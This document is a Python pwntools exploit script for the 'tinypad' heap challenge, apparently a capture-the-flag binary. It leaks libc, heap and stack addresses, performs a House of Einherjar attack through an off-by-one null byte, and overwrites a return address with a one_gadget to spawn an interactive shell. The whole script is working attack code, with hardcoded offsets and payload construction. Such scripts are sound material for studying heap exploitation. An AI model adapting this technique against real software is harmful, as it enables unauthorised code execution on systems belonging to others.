import sys
from pwn import *

def add(size, content):
    r.sendlineafter('(CMD)>>>', 'a')
    r.sendlineafter('(SIZE)>>>', str(size))
    r.sendlineafter('(CONTENT)>>>', content)

def delete(index):
    r.sendlineafter('(CMD)>>>', 'd')
    r.sendlineafter('(INDEX)>>>', str(index))

def edit(index, content):
    r.sendlineafter('(CMD)>>>', 'e')
    r.sendlineafter('(INDEX)>>>', str(index))
    r.sendlineafter('(CONTENT)>>>', content)
    r.sendlineafter('(Y/n)>>>', 'y')

def leak_libc():
    mainarena_offset = 0x3c4c58 # given by debug.
    for i in range(4):
        add(256, '\x00'*200) # 200 is meaningless.
    delete(3)
    r.recvuntil(' #   INDEX: 3\n # CONTENT: ')
    libc_base = u64(r.recv(6)+b'\x00\x00') - mainarena_offset
    return libc_base

def leak_heap():
    delete(4)
    delete(2)
    delete(1)
    for i in range(3):
        add(30, 'a'*5)
    add(256, '\x00'*200)
    delete(3)
    delete(1)
    r.recvuntil(' #   INDEX: 1\n # CONTENT: ')
    leak_addr = r.recvuntil('\n', drop=True)
    heap_base = u64(leak_addr + b'\x00' * (8-len(leak_addr))) - 0x60
    return heap_base

def house_of_einherjar(heap_base):
    fakechunk_addr = 0x6020e0
    chunk_offset = 0x1a0 # given by debug.
    delete(2)
    delete(4)
    add(200, 'a'*190) # index1
    add(200, 'a'*190) # index2
    # size of index3 chunk is needed 256 length since chunk size is 0x100 and 
    # it is not to 0x00 by off by one error. (if 0x90, it is 0x00 by off by one error.)
    add(240, 'a'*200) # index3
    delete(2)
    prev_size_offset = heap_base + chunk_offset - fakechunk_addr
    add(200, b'c'*192 + p64(prev_size_offset)) # index2
    # create fake chunk in tinypad of bss. the size 0x20 is meaningless.
    edit(3, b'\x00'*0xa8 + p64(0x20) + p64(fakechunk_addr) + p64(fakechunk_addr))
    delete(3)

def leak_stackaddr(libc_base):
    stack_offset = 0xf0 # given by debug.
    environ_offset = 0x03c7218
    libc_environ = libc_base + environ_offset
    # the size 0xdeadbeafdeadbeaf is meaningless in tinypad. 
    # The procedure is different in 0 size from in not 0 size.
    payload = b'a'*0x50
    payload += p64(0xdeadbeafdeadbeaf) + p64(libc_environ) 
    add(len(payload)+0x10, payload) # index3
    r.recvuntil(' #   INDEX: 1\n # CONTENT: ', drop=True)
    stack_environ = u64(r.recvuntil('\n', drop=True).ljust(0x8, b'\x00'))
    stack_retlibcmain = stack_environ - stack_offset
    return stack_retlibcmain

def run_shell(retaddr, libc_base):
    onegadget_offset = 0xf170d # given by one_gadget command.
    one_gadget = libc_base + onegadget_offset
    payload = b'a'*0x50
    payload += p64(0xdeadbeafdeadbeaf) + p64(retaddr)
    edit(3, payload)
    edit(1, p64(one_gadget))
    r.sendlineafter('(CMD)>>>', 'q')
    r.interactive()

def exploit():
    libc_base = leak_libc()
    log.info('Leaked libc base addr : 0x{0:x}'.format(libc_base))
    heap_base = leak_heap()
    log.info('Leaked heap base addr : 0x{0:x}'.format(heap_base))
    house_of_einherjar(heap_base)
    stack_retlibcmain = leak_stackaddr(libc_base)
    log.info('House of Einheirjar success!')
    log.info('Leaked return addr to libc_start_main in stack : 0x{0:x}'
             .format(stack_retlibcmain))
    log.info('Run shell.')
    run_shell(stack_retlibcmain, libc_base)

if __name__ == "__main__":
    if len(sys.argv) <= 1:
        print('error: missing argv', file=sys.stderr)
        sys.exit(1)
    elif sys.argv[1] == 'local':
        r = process('./tinypad')
    elif sys.argv[1] == 'remote':
        r = remote('localhost', 7777)
    else:
        print('error: unknown argv', file=sys.stderr)
        sys.exit(1)

    exploit()
